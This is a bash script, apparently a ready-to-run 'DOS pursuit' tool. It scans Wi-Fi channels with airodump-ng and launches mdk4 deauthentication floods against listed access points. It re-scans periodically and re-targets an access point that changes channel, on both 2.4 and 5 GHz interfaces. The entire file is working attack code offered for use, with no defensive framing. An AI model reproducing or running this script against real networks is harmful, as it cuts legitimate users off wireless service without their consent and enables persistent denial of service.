#!/bin/bash

# Usage: sudo ./dos.sh <scan interface/5GHz interface> <2GHz interface>

# Use default values if no arguments are passed
scan_d5_if=${1:-"wlan0"}
d2_if=${2:-"wlan1"}
log_file="dos_pursuit.log"
channel_file="channel.txt"
old_channel_file="old_channel.txt"

was_5g_deauthing=0
session_name="dos_pursuit"

stop_monitor_mode() {
  # Check to see if all interfaces are in monitor mode, else put them in monitor mode
  if iwconfig "$scan_d5_if" | grep -q "Mode:Monitor" &&
    iwconfig "$d2_if" | grep -q "Mode:Monitor"; then
    echo "Putting all interfaces in managed mode"
    airmon-ng stop "$scan_d5_if"
    airmon-ng stop "$d2_if"
  else
    echo "All interfaces are in managed mode"
  fi
}

stop_5_deauth() {
  tmux select-pane -t 3
  tmux send-keys -t 1 C-c
}

run_airodump() {

	echo "$(date "+%F %T")| Scanning for channel change" >>"$log_file"
  # Remove the old files
  rm -f "dos_pm-01.csv"
  # Run airodump-ng in the tmux pane 1 for 30 seconds
  airodump_command="airodump-ng -w ./dos_pm $scan_d5_if -c 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52 --output-format csv"
  tmux send-keys -t 1 "$airodump_command" Enter
  sleep 15
  # Kill airodump-ng
  tmux send-keys -t 1 C-c
}

process_capture() {
  rm -rf "${channel_file}" >/dev/null 2>&1

  # Extract the channel of bssids contained in bssids.txt from the capture file in the form <bssid> <channel>
  for bssid in $(cat "bssids.txt"); do
    grep "$bssid" dos_pm-01.csv | head -n 1 | cut -d ',' -f1,4 | tr -d ' ' | tr ',' ' ' >>$channel_file
  done

}

create_tmux_session() {
  tmux new-session -d -s dos_pursuit
  # Create a tmux session with two panes
  tmux split-window -v -t ${session_name}.0
  tmux split-window -h -t ${session_name}.0
  tmux split-window -h -t ${session_name}.2
}

mdk4_deauth() {
  # Usage: mdk4_deauth <if> <BSSID> <channel> <tmux pane>
  mdk_command="mdk4 $1 d -B $2 -c $3"
  tmux send-keys -t "$4" "$mdk_command" Enter
}

has_changed() {
  # Usage: compare_channel <BSSID>
  # Checks to see if channel in channel.txt matches the current channel in old_channel.txt
  # If it does, then it returns 0, else it returns 1
  if [ -f "$old_channel_file" ]; then
    old_channel=$(grep "$1" "$old_channel_file" | cut -d ' ' -f2)
    current_channel=$(grep "$1" "$channel_file" | cut -d ' ' -f2)
    [ "$old_channel" == "$current_channel" ] && return 0 || return 1
  else
    return 1
  fi
}

run_deauth_on_channel() {
  # Usage: run_deauth_on_channel <BSSID> <channel>
  if [ "$2" -gt 13 ]; then
    if [ $was_5g_deauthing -eq 0 ]; then
	    echo "$(date "+%F %T")| Starting 5GHz deauth on $1 @ $2" >>"$log_file"
    fi
    tmux send-keys -t 3 C-c
    mdk4_deauth "$scan_d5_if" "$1" "$2" 3
    was_5g_deauthing=1
  else
    echo "$(date "+%F %T")| Starting 2GHz deauth on $1 @ $2" >>"$log_file"
    tmux send-keys -t 2 C-c
    mdk4_deauth "$d2_if" "$1" "$2" 2
  fi
}

check_restarts() {
  while read -r line; do
    bssid=$(echo "$line" | cut -d ' ' -f1)
    channel=$(echo "$line" | cut -d ' ' -f2)

    if [ ! -f "$old_channel_file" ]; then
      echo "$(date "+%F %T")| Fresh attack. Starting deauth on $bssid" >>"$log_file"
      run_deauth_on_channel "$bssid" "$channel"
      continue
    fi

    has_changed "$bssid"
    if [ $? -eq 1 ]; then
      old=$(grep "$bssid" "$old_channel_file" | cut -d ' ' -f2)
      echo "$(date "+%F %T")| Channel changed for $bssid: $old -> $channel" >>"$log_file"
      run_deauth_on_channel "$bssid" "$channel"
    else
      # If 5G was deauthing
      if [ $was_5g_deauthing -eq 1 ] && [ "$channel" -gt 13 ]; then
        run_deauth_on_channel "$bssid" "$channel"
      else
        was_5g_deauthing=0
      fi
    fi
  done <"$channel_file"
}

# Check for superuser privileges
if [ "$(id -u)" != "0" ]; then
  echo "This script must be run as root" 1>&2
  exit 1
fi

#Check if script is currently executed inside tmux session or not
function check_inside_tmux() {

	# debug_print

	local parent_pid
	local parent_window
	parent_pid=$(ps -o ppid= ${PPID} 2> /dev/null | tr -d ' ')
	parent_window="$(ps --no-headers -p "${parent_pid}" -o comm= 2> /dev/null)"
	if [[ "${parent_window}" =~ tmux ]]; then
		return 0
	fi
	return 1
}


# Create the tmux session with two panes
create_tmux_session


rm -rf "$log_file" "$old_channel_file" >/dev/null 2>&1

# Log in pane 1
echo "$(date "+%F %T")| Starting DOS pursuit attack" >>"$log_file"
tmux send-keys -t 0 "tail -f $log_file" Enter
tmux select-pane -t 0

xterm -fg white -bg black -e "sudo tmux a" &
xterm_pid=$!

trap "echo The script is terminated;tmux kill-session -t dos_pursuit; exit" SIGINT

# Periodically run airodump-ng in the first tmux pane
while true; do
  run_airodump
  sleep 1
  process_capture
  sleep 1
  check_restarts

  cp "$channel_file" "$old_channel_file"
  sleep 300
done
